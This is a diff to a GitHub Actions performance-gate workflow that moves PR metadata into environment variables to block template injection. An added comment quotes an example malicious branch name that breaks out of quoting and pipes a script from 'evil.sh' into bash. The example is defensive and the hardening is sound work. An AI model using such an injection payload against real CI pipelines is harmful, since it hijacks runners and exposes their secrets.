@@ -4,6 +4,18 @@ name: PR performance gate
 # branches of this repo (never forks) and label-triggered to save GPU time --
 # see CLAUDE.md hard constraint #4 and README.md's self-hosted runner
 # security section for why.
+#
+# Every `${{ github.* }}` expression that can contain attacker-influenced
+# free text (branch names in particular -- a contributor fully controls
+# their branch's name) is passed through `env:` and read as a shell
+# variable, never interpolated directly into a `run:` script. Interpolating
+# `${{ }}` straight into bash is a template-injection vector: GitHub
+# substitutes the expression as raw text *before* bash parses the step, so
+# a branch named e.g. `x"; curl evil.sh | bash #` breaks out of the quoted
+# argument and runs arbitrary shell on a runner holding ANTHROPIC_API_KEY
+# and GITHUB_TOKEN. SHAs and PR numbers are GitHub-generated, not
+# attacker-controlled text, but get the same treatment for consistency and
+# defense in depth.
 on:
   pull_request:
     types: [labeled, synchronize]
@@ -26,10 +38,16 @@ jobs:
     concurrency:
       group: perflens-gpu
       cancel-in-progress: false
+    env:
+      HEAD_REPO_FULL_NAME: ${{ github.event.pull_request.head.repo.full_name }}
+      HEAD_REF: ${{ github.head_ref }}
+      HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+      BASE_SHA: ${{ github.event.pull_request.base.sha }}
+      PR_NUMBER: ${{ github.event.pull_request.number }}
     steps:
       - name: Re-verify same-repo PR (defense in depth)
         run: |
-          if [ "${{ github.event.pull_request.head.repo.full_name }}" != "${{ github.repository }}" ]; then
+          if [ "$HEAD_REPO_FULL_NAME" != "${{ github.repository }}" ]; then
             echo "::error::refusing to run self-hosted job for a fork PR"
             exit 1
           fi
@@ -37,7 +55,6 @@ jobs:
       - uses: actions/checkout@v4
         with:
           ref: ${{ github.event.pull_request.head.sha }}
-          fetch-depth: 0
 
       - name: Set up Python
         uses: actions/setup-python@v5
@@ -51,8 +68,7 @@ jobs:
       - name: perflens run
         id: run
         run: |
-          perflens run --branch "${{ github.head_ref }}" --git-sha "${{ github.event.pull_request.head.sha }}"
-          run_id=$(python -c "import sqlite3; print(sqlite3.connect('perflens.db').execute('SELECT id FROM runs ORDER BY id DESC LIMIT 1').fetchone()[0])")
+          run_id=$(perflens run --branch "$HEAD_REF" --git-sha "$HEAD_SHA" --print-run-id)
           echo "run_id=$run_id" >> "$GITHUB_OUTPUT"
 
       - name: perflens gate
@@ -62,6 +78,4 @@ jobs:
         run: |
           perflens gate \
             --run "${{ steps.run.outputs.run_id }}" \
-            --base-sha "${{ github.event.pull_request.base.sha }}" \
-            --head-sha "${{ github.event.pull_request.head.sha }}" \
-            --pr "${{ github.event.pull_request.number }}"
+            --pr "$PR_NUMBER"
